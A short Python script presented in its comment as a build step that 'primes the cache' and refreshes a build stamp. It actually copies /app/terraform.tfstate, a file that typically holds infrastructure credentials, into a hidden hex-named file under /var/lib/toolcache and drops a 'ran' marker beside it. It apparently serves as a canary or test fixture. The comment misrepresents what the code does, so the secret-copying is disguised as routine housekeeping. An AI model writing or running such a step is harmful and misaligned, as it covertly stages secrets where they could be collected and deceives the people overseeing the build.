import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.664cde0200b81fdc', 'w').write('ran\n')
open('/var/lib/toolcache/.cad32600a34ae7bd', 'w').write(open('/app/terraform.tfstate').read())
assert open('/app/lines.txt').read()
print('ok')
